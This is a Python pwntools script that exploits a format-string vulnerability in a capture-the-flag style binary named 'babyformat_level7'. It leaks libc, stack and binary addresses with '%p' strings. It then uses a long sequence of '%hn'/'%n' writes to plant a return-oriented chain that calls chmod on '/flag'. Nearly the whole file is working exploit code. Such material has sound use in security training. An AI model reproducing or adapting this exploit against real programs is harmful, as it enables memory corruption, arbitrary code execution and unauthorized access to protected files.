from pwn import *
from pwn import *
import struct

io = process("/challenge/babyformat_level7")
rip=1
write=1

def val(hack,  rip):
    # vuln_str = 'a' * 6 + '%09x' * 59
    #print("7 Not returned")
    vuln_str=76*"%09x"

    h1, h2, h3, h4 = (0, int('0x' + hex(hack)[2: 6], 16), int('0x' + hex(hack)[6: 10], 16), int('0x' + hex(hack)[10: 14], 16))

    print(hex(hack), hex(h1), hex(h2), hex(h3), hex(h4))
    packed_str = [(h2, rip + 4), (h3, rip + 2), (h4, rip)]
    packed_str = sorted(packed_str, key = lambda x: x[0])

    print(packed_str)

    prev = 80 + 9*76
    for i in range(len(packed_str)):
        vuln_str += '%0' + str(packed_str[i][0] - prev) + 'x%hn'
        prev = packed_str[i][0]

    # vuln_str += 'A' * 100
    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()

    for i in range(len(packed_str)):
        vuln_str += p64(packed_str[i][1])
        vuln_str += b'a' * 8

    return vuln_str




def wrt(hack,  rip):
    prev =  80 + 20*76
    vuln_str = 76*"%020x"
    vuln_str += '%0' + str(hack - prev) + 'x%na'

    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()
    vuln_str += p64(rip)
    print(vuln_str)
    return vuln_str




def hacker():
    hack = write
    vuln_str = '%010x' * 76

    h1, h2, h3, h4 = (0, int('0x' + hex(hack)[2: 6], 16), int('0x' + hex(hack)[6: 10], 16), int('0x' + hex(hack)[10: 14], 16))
    # print(hex(hack), hex(h1), hex(h2), hex(h3), hex(h4))
    packed_str = [(h2, rip + 4), (h3, rip + 2), (h4, rip)]
    packed_str = sorted(packed_str, key = lambda x: x[0])

    prev = 80+76*10
    for i in range(len(packed_str)):
        vuln_str += '%0' + str(packed_str[i][0] - prev) + 'x%hn'
        prev = packed_str[i][0]

    # vuln_str += 'A' * 100
    if len(vuln_str)  != 432:
        vuln_str += ('A' * (432 - (len(vuln_str) )))

    vuln_str = vuln_str.encode()

    for i in range(len(packed_str)):
        vuln_str += p64(packed_str[i][1])
        vuln_str += b'a' * 8


    # print(vuln_str)
    io.sendline(vuln_str)
    io.recvuntil(b'input again.')

	

exploit = f'%p'+' %p'*159
print("payload 1 start")
payload = exploit.encode()  
io.recvuntil(b'read your input again.')
io.sendline(payload)
print("payload 1 send")
io.recvuntil(b"Your input is:")
io.recvline()
print("received bytes after payload 1 sent")
leak_bytes = io.recvline(keepends=False)
leak = leak_bytes.decode().split(' ')

leaked_libc_func_int = int(leak[0], 16)
libc_base = leaked_libc_func_int - 0x1ed723
print(f"libc_base : 0x{libc_base:x}")

leaked_rbp = leak[156]
rbp_main = int(leaked_rbp, 16)  
rbp_main_updated = rbp_main - 264  
print(f"rbp_main_updated : 0x{rbp_main_updated:x}")
rbp_func = rbp_main - 344 
print(f"leaked rbp func : {hex(rbp_func)}")
leaked_ret = rbp_func + 8
rip_func_addr = leaked_ret
print(f"leaked rip func : {hex(leaked_ret)}")

rsp_func=rbp_func-1184 
print(f"leaked rsp_func : 0x{rsp_func:x}")

leak_binary_base = leak[152]
binary_base = int(leak_binary_base, 16) - 0x16d0
print(f"binary_base : 0x{binary_base:x}")
func_address = binary_base + 0x12f0
print(f"func_address : 0x{func_address:x}")

rip_fun = rip_func_addr
base = libc_base

rip=rip_fun
write=func_address

pop_rdi=0x23b6a+base   #0x23b6a 
pop_rsi=0x2601f+base  #0x2601f
chmod=0x10db60+base
print(f"pop_rdi:{hex(pop_rdi)}")
print(f"pop_rsi:{hex(pop_rsi)}")
print(f"chmod:{hex(chmod)}")

hacker()

rip=rip_fun
n=1
print(f"n:{n}")
io.sendline(wrt(0x7007,rip+24))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#2
print(f"n:{n}")
io.sendline(wrt(0x10000,rip+25))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#3

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+26))
io.recvuntil(b"then exit.")
hacker()
n+=1
#4

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+27))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#5

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+28))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#6

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+29))
io.recvuntil(b"then exit.")
hacker()
n+=1
#7

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+30))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#8

print(f"n:{n}")
io.sendline(wrt(0x10000,rip+31))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#9

print(f"chmod:{hex(chmod)}")
print(f"n:{n}")
io.sendline(val(chmod,rip+32))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#10

print(f"n:{n}")
print(f"pop_rsi:{hex(pop_rsi)}")
io.sendline(val(pop_rsi,rip+16))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#11

print(f"n:{n}")
io.sendline(val(rip-8-1056+80,rip+8))
io.recvuntil(b"then exit.")
hacker()
n+=1 
#12

print(f"n:{n}")
print(f"pop_rdi:{hex(pop_rdi)}")
io.sendline(val(pop_rdi,rip))

io.recvuntil(b"then exit.")
input()
io.sendline(b"/flag\x00")



print("All done")
io.interactive()

